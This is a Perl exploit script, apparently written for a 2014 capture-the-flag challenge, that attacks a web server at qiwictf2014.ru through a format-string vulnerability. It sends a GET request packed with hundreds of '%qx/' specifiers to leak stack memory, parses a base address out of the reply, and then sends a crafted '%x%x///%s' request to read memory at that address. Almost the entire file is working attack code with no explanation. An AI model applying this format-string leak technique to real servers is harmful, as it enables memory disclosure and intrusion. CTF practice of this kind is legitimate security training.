#!/usr/bin/perl

use strict;
use IO::Socket::SSL;
$|=1;
my $sock = IO::Socket::SSL->new("qiwictf2014.ru:8445") or die "Bad\n";
die "dead 1" unless $sock->connected();


syswrite $sock, "GET " . 
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' . 
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' . 
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' .
'%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/%qx/' . " HTTP/1.0\nConnection: Keep-Alive\n\n";

die "dead 2" unless $sock->connected();
sysread $sock, my $data, 102400;
die "dead 3" unless $sock->connected();

#print $data;
sysread $sock, my $data, 102400;
die "dead 4" unless $sock->connected();

#open FILE, ">data1.txt";
my @array = split /\//, $data;
my @print_addr;
#for (0..$#array) {
#	print $array[$_],"\n";
#	if ($array[$_] =~ /^(f7)/) {
#		push @print_addr,$array[$_];
#		print $array[$_],"\n";
#	}

#}

my $base = hex(substr($array[606],0,8));
print $base,"\n";

#__END__
print "\n\nNXTNXTNXT\n\n";
#for (0..$#print_addr) {
#	my $hexval = hex($print_addr[$_]);

	my $hexval = $base;
	syswrite $sock, "GET " . pack("I*", $hexval) . '%x%x///%s' . " HTTP/1.0\nConnection: Keep-Alive\n\n";
	print "SEND QUERY:\n", "GET " . pack("I*", $hexval) . '%x%x///%s' . " HTTP/1.0\nConnection: Keep-Alive\n\n";
	sysread $sock, my $data, 10240;
#	print $data,"\n";
	sysread $sock, my $data, 10240;
	print $data,"\n";
#	$data =~ m/Page:(.+?)\/\/\/(.+?) not found/;
#	print "0x$print_addr[$_] => " . unpack("H*", $2), "\n";

#}

#$data =~ m/Page(.+?)\/\/\/(.+?)\snot\sfound\s:/;
